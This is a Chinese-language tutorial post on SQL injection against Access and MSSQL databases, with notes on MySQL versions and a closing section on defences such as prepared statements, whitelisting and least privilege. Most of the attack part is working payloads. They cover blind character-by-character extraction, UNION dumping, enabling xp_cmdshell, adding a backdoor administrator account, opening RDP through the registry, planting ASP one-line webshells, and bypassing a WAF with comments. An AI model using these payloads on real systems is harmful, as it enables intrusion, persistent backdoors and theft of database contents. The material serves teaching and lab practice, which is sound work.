---
layout: post
title: 其他数据库的注入
date: 2026-04-29
tags: [access, sqlserver, 其他版本的mysql]
---

## 一、Access 数据库

Access 数据库采用**单文件管理单数据库**的架构，类似于 Excel 的工作簿。一个 `.mdb` 文件就是一个数据库，这一点与 MySQL 可以同时管理多个数据库截然不同。

> ⚠️ 如果 Access 数据库的 `.db` 文件路径或文件名没有设置好，很容易被下载到手。

![Access 数据库界面](/assets/images/07/image-1.png)
![Access 数据库文件结构](/assets/images/07/image.png)

### 1.1 寻找注入点

我们用**单引号**测试是否存在注入点，发现数据库报错，说明注入点存在。

![单引号测试](/assets/images/07/image-2.png)

观察后端查询语句，发现语句结尾**没有**用单/双引号包裹，因此编写 payload 时也**不需要注释符**（`#` 或 `--`）。

![查询语句分析](/assets/images/07/image-3.png)

---

### 1.2 暴力猜解法

#### 1.2.1 猜测数据表名

首先猜解数据库的表名，没有太多取巧的方法，只能暴力猜解。MySQL 5.0 以前版本也依赖暴力猜解，需要准备字典（表名、库名、字段名等）。

**核心函数：`exists()`**

- 如果有数据，返回 `1`：
  ![exists 返回 1](/assets/images/07/image-4.png)

- 如果没有数据，返回 `0`：
  ![exists 返回 0](/assets/images/07/image-5.png)

**判断逻辑：** 有表（无论表中是否有内容）都不报错；无表则直接报错。

![有表不报错，无表报错](/assets/images/07/image-6.png)

**Payload：**

```sql
and exists(select * from users)
```

**示例：**

无 `users` 表 → 报错：

![无 users 表报错](/assets/images/07/image-7.png)

有 `news` 表 → 正常：

![有 news 表正常](/assets/images/07/image-8.png)

---

#### 1.2.2 猜测字段名

在猜出表名的基础上，将 `*` 替换为各种字段名即可：

```sql
and exists(select username from administrator)

and exists(select user_name from administrator)
```

---

#### 1.2.3 猜测字段数据长度

MySQL 下使用 `length()` 函数，Access 下使用 `len()` 函数：

```sql
-- 取出 administrator 表的第一行记录，查询 user_name 字段的长度
-- TOP 1 类似于 MySQL 的 LIMIT 0, 1
and (select top 1 len(user_name) from administrator) > 2
```

**判断方法：** 用返回结果与 1、2、3、4…… 依次比较，**第一次报错时的数字即为字段长度**。

```sql
and (select top 1 len(user_name) from administrator) > 2  -- 正常
and (select top 1 len(user_name) from administrator) > 5  -- 报错
-- 说明 user_name 字段长度为 5
```

---

#### 1.2.4 猜解字段数据内容

已知数据长度后，逐个字符进行猜测。

**核心函数：**

| 函数 | 说明 |
|------|------|
| `mid(字符串, 起始位, 截取位数)` | 从中间位置取子串，类似 MySQL 的 `substr()` |
| `asc(字符)` | 查看字符的 ASCII 码值，类似 MySQL 的 `ascii()` |

> 💡 ASCII 值大于 0 → 字母；小于 0 → 汉字（ASCII 码表中没有汉字，返回负数）。

```sql
-- 猜测第 1 个字符的 ASCII 值
and (select top 1 asc(mid(user_name, 1, 1)) from administrator) > 0
```

![mid 和 asc 函数使用](/assets/images/07/image-10.png)

**二分法猜解示例：**

```sql
-- 大于 500 → 报错（ASCII 值在 0~500 之间）
and (select top 1 asc(mid(user_name, 1, 1)) from administrator) > 500

-- 大于 100 → 报错（ASCII 值在 0~100 之间）
and (select top 1 asc(mid(user_name, 1, 1)) from administrator) > 100

-- 大于 90 → 正常（ASCII 值在 90~100 之间）
and (select top 1 asc(mid(user_name, 1, 1)) from administrator) > 90

-- 大于 96 → 正常（ASCII 值在 96~100 之间）
and (select top 1 asc(mid(user_name, 1, 1)) from administrator) > 96

-- 大于 97 → 报错 → 第一位 ASCII 值为 97 → 字符 'a'
and (select top 1 asc(mid(user_name, 1, 1)) from administrator) > 97
```

得到第一位字符后，继续猜第二位：`mid(user_name, 2, 1)`，以此类推。

---

### 1.3 UNION 联合查询法（更高效）

#### 1.3.1 判断列数 — ORDER BY 法

```sql
SELECT email, id FROM member ORDER BY 1, 2;
```

`ORDER BY 1, 2` 表示按列的顺序排序。如果后面的数字**小于等于**实际列数则正常，**超过**则报错，利用这个特性判断列数。

**Payload：**

```sql
' ORDER BY 1,2,3#
```

如果 `n-1` 时返回正常、`n` 时返回错误，则字段数目为 `n-1`。

---

#### 1.3.2 判断显示列并爆出数据

并不是查询多少列就显示多少列，需要先确定哪些列会在页面回显。

```sql
union select 1,2,3,4,5,6,7 from administrator
-- ⚠️ 与 MySQL 不同，Access 的 UNION 查询末尾必须加上表名
```

![回显位置测试](/assets/images/07/image-11.png)

假设页面只显示第 2、3 列，将其替换为需要查询的字段名：

![替换字段查询](/assets/images/07/image-12.png)

---

### 1.4 工具推荐

- **sqlmap** — 自动化 SQL 注入工具

---

## 二、MSSQL 数据库（SQL Server）

### 2.1 介绍

MSSQL（Microsoft SQL Server）与 MySQL 大同小异，主要是语法和函数的写法不同。

| 数据库 | 默认端口 | 说明 |
|--------|----------|------|
| MSSQL | **1433** | 默认允许远程连接 |
| MySQL | 3306 | 需要授权才能远程连接 |
| Oracle | 1521 | — |

> 在 Windows 下通过 `netstat -an -p tcp -o` 指令可查看端口占用，并通过任务管理器中的 PID 对应到具体进程。

![netstat 查看端口](/assets/images/07/image-18.png)

---

### 2.2 权限体系

MSSQL 的三大权限级别：

| 权限 | 说明 |
|------|------|
| **sa** | 最高权限（类似 Windows 的 SYSTEM、Linux 的 root） |
| **db_owner** | 数据库所有者权限 |
| **public** | 最低权限 |

查看用户属性：

![查看用户](/assets/images/07/image-13.png)

- **常规属性：**
  ![常规属性](/assets/images/07/image-14.png)

- **服务器角色：**
  ![服务器角色](/assets/images/07/image-15.png)

- **用户映射（分配数据库权限）：**
  ![用户映射](/assets/images/07/image-16.png)

- **状态：**
  ![状态](/assets/images/07/image-17.png)

**测试环境：**

```
http://192.168.188.132/sqlserver/1.aspx?xxser=1
```

![测试环境](/assets/images/07/image-19.png)

明显存在注入点。

---

### 2.3 判断是否为 MSSQL 注入点

提交以下查询，有结果则说明数据库是 MSSQL（`sysobjects` 是 MSSQL 自带的系统表）：

```sql
and exists(select * from sysobjects)
```

---

### 2.4 查询当前数据库系统用户名

```sql
and system_user=0
```

`system_user` 返回的是**字符型**数据，与数字型 `int` 比较时会因类型不匹配而报错，从错误信息中可获取当前系统用户名。

![查询系统用户名](/assets/images/07/image-20.png)

---

### 2.5 sa 权限注入

#### 2.5.1 检查是否为 sa 权限

```sql
and 1=(select IS_SRVROLEMEMBER('sysadmin'))

-- 或者
AND (SELECT TOP 1 name FROM sys.syslogins WHERE sysadmin=1) = SUSER_SNAME()--
```

未报错则说明当前是 sa 权限。

![sa 权限检查](/assets/images/07/image-21.png)

#### 2.5.2 检查 xp_cmdshell 是否存在

`xp_cmdshell` 是 MSSQL 的扩展存储功能，可以直接**执行操作系统命令**（如 `ipconfig`、`whoami` 等）。默认禁用，且**只有 sa 权限才能开启**。

```sql
and 1=(select count(*) from master.dbo.sysobjects where name='xp_cmdshell')
```

![xp_cmdshell 检查](/assets/images/07/image-22.png)

未报错 → 已开启；报错 → 未开启。

#### 2.5.3 开启 xp_cmdshell

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
--
```

#### 2.5.4 添加系统账号

```sql
;exec master..xp_cmdshell 'net user jaden 123456 /add'
```

#### 2.5.5 将账号加入管理员组

```sql
;exec master..xp_cmdshell 'net localgroup administrators jaden /add'
```

#### 2.5.6 开启 3389 远程桌面

默认远程桌面是关闭的。通过修改注册表开启：

```sql
;exec master.dbo.xp_regwrite 'HKEY_LOCAL_MACHINE',
   'SYSTEM\CurrentControlSet\Control\Terminal Server',
   'fDenyTSConnections', 'REG_DWORD', 0;
```

开启后即可使用账号 `jaden` / 密码 `123456` 远程连接：

![远程连接](/assets/images/07/image-23.png)

---

### 2.6 db_owner 权限注入

#### 2.6.1 检查是否为 db_owner 权限

```sql
and 1=(SELECT IS_MEMBER('db_owner'));--
```

#### 2.6.2 查找网站绝对路径

**方法一：报错信息 / 搜索引擎**

通过报错页面或 `site:xxx.com` 等语法搜索敏感信息。

**方法二：扫描工具**

7kb、dirsearch 等目录扫描工具。

**方法三：利用 xp_cmdshell（需对方已开启）**

```sql
-- 1. 创建临时表
;drop table black;
create Table black(result varchar(7996) null, id int not null identity(1,1))--

-- 2. 将系统命令执行结果插入表中
insert into black exec master..xp_cmdshell 'dir /s c:\1.aspx'--

-- 3. 逐条读取结果（修改 id 值翻页）
and (select result from black where id=4) > 0--
```

![路径查找结果](/assets/images/07/image-24.png)

**一句话木马获取 WebShell：**

```sql
;exec master..xp_cmdshell 'Echo "<%eval request("jaden")%>" >> c:\www\wwwroot\sqlserver\muma.asp'--
```

![写入木马](/assets/images/07/image-26.png)
![连接成功](/assets/images/07/image-27.png)
![蚁剑连接](/assets/images/07/image-25.png)

权限不够时：

![权限不足](/assets/images/07/image-28.png)

**差异备份法（不依赖 xp_cmdshell）：**

如果不确定 xp_cmdshell 是否开启，可以使用差异备份写入一句话木马：

```sql
;alter database testdb set RECOVERY FULL;
create table test_tmp(str image);
backup log testdb to disk='c:\test1' with init;
insert into test_tmp(str) values(0x3C2565786375746528726571756573742822636D64222929253E);
backup log testdb to disk='c:\www\iis\aspx\yjh.asp';
alter database testdb set RECOVERY simple;
```

然后使用蚁剑连接。

---

### 2.7 public 权限注入

public 是最低权限，**无法获取 WebShell 或执行系统命令**，但可以拖库（读取数据库内容）。只要发现注入点，基本都可以拖库，但能否拿到操作系统权限取决于数据库用户的权限等级。

#### 2.7.1 获取当前数据库名

```sql
and db_name()=0--
```

![当前数据库名](/assets/images/07/image-29.png)

#### 2.7.2 获取所有数据库名

```sql
and 1=(select db_name())--+
and 1=(select db_name(1))--+
and 1=(select db_name(2))--+
-- 递增序号枚举所有数据库
```

#### 2.7.3 获取当前数据库所有表名

```sql
-- 通过修改 TOP 后的数字和 NOT IN 中的数字来翻页枚举
and (select top 1 name from testdb.sys.all_objects 
    where type='U' AND is_ms_shipped=0 
    and name not in (
        select top 0 name from testdb.sys.all_objects 
        where type='U' AND is_ms_shipped=0
    )) > 0--
```

![枚举表名](/assets/images/07/image-30.png)
![枚举表名结果](/assets/images/07/image-31.png)

#### 2.7.4 获取字段名 — HAVING 法

利用 `having 1=1--` 报错信息获取字段名：

```sql
having 1=1--
```

![having 报错](/assets/images/07/image-32.png)

将报错得到的字段带入 `GROUP BY` 继续获取下一个字段：

```sql
group by admin.id having 1=1--
```

![group by 第一步](/assets/images/07/image-33.png)

```sql
group by admin.id,admin.name having 1=1--
```

![group by 第二步](/assets/images/07/image-34.png)

由此得到 `admin` 表有三个字段：`id`、`name`、`password`。如此往复可获取所有字段。

#### 2.7.5 获取字段内容

```sql
/**/and/**/(select/**/top/**/1/**/
  isnull(cast([id] as nvarchar(4000)), char(32))
  +char(94)+
  isnull(cast([name] as nvarchar(4000)), char(32))
  +char(94)+
  isnull(cast([password] as nvarchar(4000)), char(32))
/**/from/**/[testdb]..[admin]/**/
  where/**/1=1/**/and/**/id/**/not/**/in/**/
  (select/**/top/**/0/**/id/**/from/**/[testdb]..[admin]/**/
  where/**/1=1/**/group/**/by/**/id))>0/**/and/**/1=1
```

> `/**/` 与空格效果相同，用于绕过 WAF。将库名、表名、字段名替换为实际发现的即可。

![字段内容获取](/assets/images/07/image-35.png)

---

### 2.8 工具推荐

- **穿山甲（Pangolin）**
- **sqlmap**

---

### 2.9 MySQL 版本区别

| 特性 | MySQL < 5.0 | MySQL ≥ 5.0 |
|------|-------------|-------------|
| `information_schema` | ❌ 无 | ✅ 有（`schemata`、`tables`、`columns`） |
| 注入方式 | 只能暴力猜解 | 可查询系统表 |
| 操作模式 | 多用户单操作 | 多用户多操作 |

`information_schema` 中的关键表和字段：

| 表名 | 关键字段 | 存放内容 |
|------|----------|----------|
| `schemata` | `schema_name` | 所有库名 |
| `tables` | `table_schema`, `table_name` | 库名 + 表名 |
| `columns` | `table_schema`, `table_name`, `column_name` | 库名 + 表名 + 字段名 |

![information_schema 结构](/assets/images/07/image-36.png)

**用户创建和授权的差异：**

```sql
-- MySQL 5.7：一条语句搞定
GRANT ALL PRIVILEGES ON *.* TO 'user'@'%' IDENTIFIED BY '123456';

-- MySQL 8.0：必须分开执行
CREATE USER 'user'@'%' IDENTIFIED BY '123456';
GRANT ALL PRIVILEGES ON *.* TO 'user'@'%';
```

**MySQL 8.0 新增函数：**

```sql
-- TABLE 函数（等同于 SELECT * FROM）
TABLE users;

-- VALUES 函数（等同于 SELECT）
SELECT * FROM user UNION VALUES ROW(2, 3);
-- 等同于
SELECT * FROM user UNION SELECT 2, 3;
```

> ⚠️ `TABLE` 查询始终返回所有列，且不能使用 `WHERE` 子句。

---

## 三、SQL 注入防护

测试环境：DVWA（部署在 PHP 虚拟机中）

防护的核心思想：**对用户提交的数据做严格过滤**。

### 防护手段一览

#### ① 数据类型校验

```php
is_numeric($id)  // id 值必须是数字
```

#### ② 正则匹配过滤

禁止 `union`、`or`、`and` 等注入关键词。

#### ③ 特殊字符转义

使用 `addslashes()`、`mysqli_real_escape_string()` 等函数转义单引号、双引号等特殊字符。

#### ④ 参数化查询（Prepared Statement）⭐ 最推荐

将用户输入作为**参数值**处理，而非 SQL 语句的一部分：

```php
$data = $db->prepare(
    'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;'
);
$data->bindParam(':id', $id, PDO::PARAM_INT);
$data->execute();
```

> ⚠️ **预编译的局限性：** 如果表名是动态的（由用户提交），预编译也无法防护，因为**表名不能进行参数绑定**。此时需要配合**白名单过滤**：
>
> ```php
> if ($table_name == 'jaden') {
>     $data = $db->prepare('SELECT * FROM jaden WHERE user_id = (:id) LIMIT 1;');
> } elseif ($table_name == 'wulaoban') {
>     $data = $db->prepare('SELECT * FROM wulaoban WHERE user_id = (:id) LIMIT 1;');
> } else {
>     echo '别乱搞！';
> }
> ```

#### ⑤ 权限分级管理

- 禁止使用 `root` / `sa` 等高权限账号连接数据库
- 普通用户仅授予必要的查询权限
- 系统管理员才具有增删改查权限

#### ⑥ 敏感数据加密

用户密码等敏感数据必须加密/哈希存储。

---

### 防护等级对比（DVWA 示例）

**🔴 Security: Low — 无任何防护**

```php
$query = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
```

![无防护](/assets/images/07/image-37.png)

**🟡 Security: Medium — 转义特殊字符**

```php
$id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id);
$query = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
```

![转义防护](/assets/images/07/image-38.png)

> 对数字型注入无效（因为数字型不需要引号）。

**🟠 Security: High — Session 获取 ID**

```php
// 直接从 $_SESSION 获取，不接收外部输入
$id = $_SESSION['id'];
```

![Session 防护](/assets/images/07/image-39.png)

**🟢 Security: Impossible — 顶级防护（类型校验 + 预编译）**

```php
// 1. 类型校验
if (!is_numeric($id)) {
    // 拒绝非数字输入（注：十六进制 payload 也是数字型，仍可绕过）
}

// 2. PDO 预处理（参数化查询）
$sql = "SELECT * FROM users WHERE user_id = :id";
$stmt = $pdo->prepare($sql);
$stmt->bindParam(':id', $id, PDO::PARAM_INT);
$stmt->execute();
```

![顶级防护](/assets/images/07/image-40.png)

> 将 `1' or 1=1#` 整体赋值给 `:id`，作为参数值处理（和 `1`、`2`、`3` 一样），不再被当作 SQL 语句执行。

---

### 总结

| 原则 | 说明 |
|------|------|
| 🚫 **永远不要信任用户输入** | 正则校验、长度限制、特殊字符转义 |
| 🚫 **永远不要动态拼装 SQL** | 使用参数化查询或存储过程 |
| 🚫 **永远不要用高权限连接数据库** | 每个应用使用独立的最小权限账号 |
| 🔒 **敏感信息加密存储** | 密码等必须 hash 或加密 |
| 🤫 **最小化错误提示** | 自定义错误信息，原始异常存入日志表 |
